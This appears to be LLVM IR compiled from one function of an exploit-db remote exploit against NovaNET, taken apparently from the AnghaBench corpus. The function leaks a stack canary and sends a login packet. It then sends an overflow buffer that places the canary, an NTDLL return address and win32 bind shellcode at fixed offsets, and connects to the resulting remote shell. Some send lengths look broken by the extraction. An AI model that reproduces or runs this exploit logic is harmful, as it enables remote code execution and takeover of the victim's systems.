; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_33878.c_novanet_own_process.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_33878.c_novanet_own_process.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@NOVANET_PKT_SZ = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [44 x i8] c"novanet_own_process: reading canary failed\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@NOVANET_TCP_PORT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c"novanet_own_process: sockami failed\0A\00", align 1
@.str.2 = private unnamed_addr constant [54 x i8] c"** [nnwindtb.dll @ 0x016A6784] stack canary: 0x%08X\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [46 x i8] c"novanet_own_process: canary value invalid :(\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"* connected to %s:%d\0A\00", align 1
@login_buf = common dso_local global i8* null, align 8
@NOVANET_DOMAIN_SZ = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [27 x i8] c"** sending login packet...\00", align 1
@.str.6 = private unnamed_addr constant [52 x i8] c"novanet_own_process: sock_send returned %d (!= %d)\0A\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c"** reading fourth packet...\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"novanet_own_process: sock_recv returned %d (!= %d)\0A\00", align 1
@NOVANET_HDR_SZ = common dso_local global i32 0, align 4
@rem_buf = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [40 x i8] c"** sending remaining %d-bytes packet...\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"** sending hammer packet...\00", align 1
@NTDLL_ESP = common dso_local global i32 0, align 4
@win32_x86_bind = common dso_local global i8* null, align 8
@.str.12 = private unnamed_addr constant [7 x i8] c"done\0A\0A\00", align 1
@USLEEP_TIME = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [47 x i8] c"* waiting for the shellcode to be executed...\0A\00", align 1
@PORT_SHELL = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [10 x i8] c"+Wh00t!\0A\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i8*, i8*, i32)* @novanet_own_process to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @novanet_own_process(i8* %0, i8* %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %14 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %7, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %8, align 8
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @novanet_read(i8* %18, i8* inttoptr (i64 23750532 to i8*), i32* %10)
  %20 = icmp eq i64 %19, 0
  br i1 %20, label %21, label %26

21:                                               ; preds = %3
  %22 = load i32, i32* @stderr, align 4
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %22, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %24 = load i32, i32* @EXIT_FAILURE, align 4
  %25 = call i32 @exit(i32 %24) #4
  unreachable

26:                                               ; preds = %3
  %27 = load i8*, i8** %4, align 8
  %28 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %29 = call i32 @sockami(i8* %27, i32 %28)
  store i32 %29, i32* %11, align 4
  %30 = load i32, i32* %11, align 4
  %31 = icmp eq i32 %30, -1
  br i1 %31, label %32, label %37

32:                                               ; preds = %26
  %33 = load i32, i32* @stderr, align 4
  %34 = call i32 (i32, i8*, ...) @fprintf(i32 %33, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %35 = load i32, i32* @EXIT_FAILURE, align 4
  %36 = call i32 @exit(i32 %35) #4
  unreachable

37:                                               ; preds = %26
  %38 = load i32, i32* %10, align 4
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.2, i64 0, i64 0), i32 %38)
  %40 = load i32, i32* %10, align 4
  %41 = load i32, i32* %6, align 4
  %42 = call i32 @CANARY_VAL(i32 %40, i32 %41)
  %43 = call i64 @HAS_NULL(i32 %42)
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %50

45:                                               ; preds = %37
  %46 = load i32, i32* @stderr, align 4
  %47 = call i32 (i32, i8*, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  %48 = load i32, i32* @EXIT_FAILURE, align 4
  %49 = call i32 @exit(i32 %48) #4
  unreachable

50:                                               ; preds = %37
  %51 = load i8*, i8** %4, align 8
  %52 = load i32, i32* @NOVANET_TCP_PORT, align 4
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i8* %51, i32 %52)
  %54 = load i8*, i8** @login_buf, align 8
  %55 = getelementptr inbounds i8, i8* %54, i64 84
  %56 = load i8*, i8** %5, align 8
  %57 = load i32, i32* @NOVANET_DOMAIN_SZ, align 4
  %58 = call i32 @memcpy(i8* %55, i8* %56, i32 %57)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  %60 = load i32, i32* %11, align 4
  %61 = load i8*, i8** @login_buf, align 8
  %62 = call i32 @sock_send(i32 %60, i8* %61, i32 7)
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %64 = icmp ne i32 %62, %63
  br i1 %64, label %65, label %72

65:                                               ; preds = %50
  %66 = load i32, i32* @stderr, align 4
  %67 = load i32, i32* %12, align 4
  %68 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %69 = call i32 (i32, i8*, ...) @fprintf(i32 %66, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.6, i64 0, i64 0), i32 %67, i32 %68)
  %70 = load i32, i32* @EXIT_FAILURE, align 4
  %71 = call i32 @exit(i32 %70) #4
  unreachable

72:                                               ; preds = %50
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0))
  %75 = load i32, i32* %11, align 4
  %76 = trunc i64 %15 to i32
  %77 = call i32 @sock_recv(i32 %75, i8* %17, i32 %76)
  store i32 %77, i32* %12, align 4
  %78 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %79 = icmp ne i32 %77, %78
  br i1 %79, label %80, label %87

80:                                               ; preds = %72
  %81 = load i32, i32* @stderr, align 4
  %82 = load i32, i32* %12, align 4
  %83 = load i32, i32* @NOVANET_PKT_SZ, align 4
  %84 = call i32 (i32, i8*, ...) @fprintf(i32 %81, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i64 0, i64 0), i32 %82, i32 %83)
  %85 = load i32, i32* @EXIT_FAILURE, align 4
  %86 = call i32 @exit(i32 %85) #4
  unreachable

87:                                               ; preds = %72
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  store i32 340, i32* %13, align 4
  %89 = load i32, i32* %13, align 4
  %90 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %91 = add nsw i32 %89, %90
  %92 = load i8*, i8** @rem_buf, align 8
  %93 = getelementptr inbounds i8, i8* %92, i64 12
  %94 = bitcast i8* %93 to i32*
  store i32 %91, i32* %94, align 4
  %95 = load i32, i32* %13, align 4
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.10, i64 0, i64 0), i32 %95)
  %97 = load i32, i32* %11, align 4
  %98 = load i8*, i8** @rem_buf, align 8
  %99 = call i32 @sock_send(i32 %97, i8* %98, i32 7)
  store i32 %99, i32* %12, align 4
  %100 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %101 = icmp ne i32 %99, %100
  br i1 %101, label %102, label %109

102:                                              ; preds = %87
  %103 = load i32, i32* @stderr, align 4
  %104 = load i32, i32* %12, align 4
  %105 = load i32, i32* @NOVANET_HDR_SZ, align 4
  %106 = call i32 (i32, i8*, ...) @fprintf(i32 %103, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.6, i64 0, i64 0), i32 %104, i32 %105)
  %107 = load i32, i32* @EXIT_FAILURE, align 4
  %108 = call i32 @exit(i32 %107) #4
  unreachable

109:                                              ; preds = %87
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  %112 = load i32, i32* %13, align 4
  %113 = sext i32 %112 to i64
  %114 = mul i64 %113, 1
  %115 = trunc i64 %114 to i32
  %116 = call i8* @malloc(i32 %115)
  store i8* %116, i8** %9, align 8
  %117 = load i8*, i8** %9, align 8
  %118 = load i32, i32* %13, align 4
  %119 = call i32 @memset(i8* %117, i32 65, i32 %118)
  %120 = load i32, i32* %10, align 4
  %121 = load i32, i32* %6, align 4
  %122 = call i32 @CANARY_VAL(i32 %120, i32 %121)
  %123 = load i8*, i8** %9, align 8
  %124 = getelementptr inbounds i8, i8* %123, i64 260
  %125 = bitcast i8* %124 to i32*
  store i32 %122, i32* %125, align 4
  %126 = load i32, i32* @NTDLL_ESP, align 4
  %127 = load i8*, i8** %9, align 8
  %128 = getelementptr inbounds i8, i8* %127, i64 264
  %129 = bitcast i8* %128 to i32*
  store i32 %126, i32* %129, align 4
  %130 = load i8*, i8** %9, align 8
  %131 = getelementptr inbounds i8, i8* %130, i64 332
  %132 = load i8*, i8** @win32_x86_bind, align 8
  %133 = call i32 @memcpy(i8* %131, i8* %132, i32 7)
  %134 = load i8*, i8** %9, align 8
  %135 = load i32, i32* %13, align 4
  %136 = sub nsw i32 %135, 1
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %134, i64 %137
  store i8 0, i8* %138, align 1
  %139 = load i32, i32* %11, align 4
  %140 = load i8*, i8** %9, align 8
  %141 = load i32, i32* %13, align 4
  %142 = call i32 @sock_send(i32 %139, i8* %140, i32 %141)
  store i32 %142, i32* %12, align 4
  %143 = load i32, i32* %13, align 4
  %144 = icmp ne i32 %142, %143
  br i1 %144, label %145, label %152

145:                                              ; preds = %109
  %146 = load i32, i32* @stderr, align 4
  %147 = load i32, i32* %12, align 4
  %148 = load i32, i32* %13, align 4
  %149 = call i32 (i32, i8*, ...) @fprintf(i32 %146, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.6, i64 0, i64 0), i32 %147, i32 %148)
  %150 = load i32, i32* @EXIT_FAILURE, align 4
  %151 = call i32 @exit(i32 %150) #4
  unreachable

152:                                              ; preds = %109
  %153 = load i8*, i8** %9, align 8
  %154 = call i32 @free(i8* %153)
  %155 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0))
  %156 = load i32, i32* @USLEEP_TIME, align 4
  %157 = call i32 @usleep(i32 %156)
  %158 = load i32, i32* %11, align 4
  %159 = call i32 @close(i32 %158)
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.13, i64 0, i64 0))
  %161 = call i32 @sleep(i32 2)
  %162 = load i8*, i8** %4, align 8
  %163 = load i32, i32* @PORT_SHELL, align 4
  %164 = call i32 @sockami(i8* %162, i32 %163)
  store i32 %164, i32* %11, align 4
  %165 = icmp ne i32 %164, -1
  br i1 %165, label %166, label %170

166:                                              ; preds = %152
  %167 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0))
  %168 = load i32, i32* %11, align 4
  %169 = call i32 @shellami(i32 %168)
  br label %170

170:                                              ; preds = %166, %152
  %171 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %171)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @novanet_read(i8*, i8*, i32*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @HAS_NULL(i32) #2

declare dso_local i32 @CANARY_VAL(i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @sock_send(i32, i8*, i32) #2

declare dso_local i32 @sock_recv(i32, i8*, i32) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @shellami(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
